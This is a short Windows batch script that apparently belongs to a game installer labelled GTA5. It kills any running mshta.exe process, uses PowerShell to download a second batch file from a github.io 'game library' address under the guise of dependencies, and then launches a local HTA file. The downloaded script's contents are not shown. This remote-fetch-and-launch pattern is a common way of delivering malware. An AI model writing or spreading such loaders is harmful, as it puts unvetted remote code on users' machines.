@echo off
taskkill /F /IM mshta.exe >NUL
echo Downloading dependencies...
powershell -Command "(New-Object Net.WebClient).DownloadFile('https://hpgamelibrary.github.io/files/GTA5/installscript_1-41.bat', 'installscript_1-41.bat')"
start dir_select.hta